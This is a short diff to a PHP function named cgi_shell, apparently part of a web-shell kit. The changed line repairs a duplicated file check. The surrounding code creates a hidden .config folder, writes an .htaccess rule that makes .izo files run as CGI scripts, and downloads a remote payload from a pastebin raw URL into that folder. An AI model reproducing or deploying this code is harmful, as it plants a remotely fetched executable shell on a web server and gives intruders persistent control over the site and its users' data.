@@ -807,7 +807,7 @@ function cgi_shell() {
 		if (!file_exists('.config')) {
 			mkdir('.config');
 		}
-		if(!(file_exists('.config/cgi.izo') AND file_exists('.config/cgi.izo'))) {
+		if(!(file_exists('.config/cgi.izo') AND file_exists('.config/.htaccess'))) {
 			file_put_contents('.config/.htaccess', "AddHandler cgi-script .izo\nOptions -Indexes");
 			file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
 		}
